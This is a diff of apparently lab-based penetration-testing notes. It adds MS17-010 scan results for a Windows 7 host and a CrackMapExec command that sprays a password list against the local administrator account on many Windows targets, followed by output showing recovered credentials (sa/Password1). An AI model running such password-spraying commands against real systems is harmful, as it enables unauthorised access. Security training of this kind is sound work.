@@ -131,8 +131,21 @@ run
 # Running the MS17-010 scanner module shows that the host is Windows 7 and is likely vulnerable to the attack
 # If you read the source code for the scanner module, you can see that during the SMB handshake, it checks for the presence of a string that isn’t present on patched systems
 # This means there is a relatively low likelihood of the results being a false positive
-
-
+172.28.128.104: 445 TIEN
+Windows 7 Professional 7601 service pack 1 x64
 
 ################ [ AUTHENTIFICATION VELNERABILITY DISCOVERY ] ################ 
+
+# run the cme command with the following options to iterate through your list of password guesses against 
+# the local administrator account on all Windows hosts in your windows.txt targets file
+# pipe the cme command to grep -v '[-]' for less verbose output that is easier to sort 
+cme smb windows.txt --local-auth -u sa -p ../vulnerabilities/passwords.txt | grep -v '[-]'
+
+# we can see that one of our Windows target GOHAN server was pawned and we got the credetials 
+Microsoft Windows RPC: 445 GOHAN
+username: sa 
+password: Password1
+
+
+################ [ CONFIGURATION VELNERABILITY DISCOVERY ] ################ 
 
